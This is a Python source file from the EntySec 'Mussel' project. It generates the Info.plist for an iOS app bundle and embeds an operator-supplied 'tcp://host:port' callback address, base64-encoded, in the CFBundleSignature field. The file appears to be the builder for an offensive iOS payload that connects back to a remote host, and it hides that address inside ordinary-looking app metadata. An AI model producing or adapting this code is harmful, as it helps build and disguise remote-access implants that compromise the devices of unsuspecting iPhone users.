"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import plistlib

from pex.string import String

app_name = 'Mussel'
bundle_id = 'com.entysec.mussel'
binary_name = 'main'


def generate_plist(host: str, port: int) -> dict:
    """ Generate Info.plist file contents.

    :param str host: host to connect to
    :param int port: port to connect to
    :return dict: Info.plist contents
    """

    return {
        'CFBundleDevelopmentRegion': 'en',
        'CFBundleDisplayName': app_name,
        'CFBundleExecutable': binary_name,
        'CFBundleIdentifier': bundle_id,
        'CFBundleInfoDictionaryVersion': '6.0',
        'CFBundleName': app_name,
        'CFBundlePackageType': 'APPL',
        'CFBundleShortVersionString': '1.0.0',
        'CFBundleSignature': String().base64_string(f'tcp://{host}:{str(port)}', decode=True),
        'CFBundleVersion': '1',
        'LSRequiresIPhoneOS': True,
        'UISupportedInterfaceOrientations': [
            'UIInterfaceOrientationPortrait',
            'UIInterfaceOrientationPortraitUpsideDown',
            'UIInterfaceOrientationLandscapeLeft',
            'UIInterfaceOrientationLandscapeRight'
        ]
    }


def main() -> None:
    """ Entry point for CLI.

    :return None: None
    """

    if len(sys.argv) < 4:
        print(f'Usage: {sys.argv[0]} <host> <port> <path>')
        return

    with open(sys.argv[3], 'wb') as f:
        plistlib.dump(generate_plist(sys.argv[1], sys.argv[2]), f)


if __name__ == "__main__":
    main()
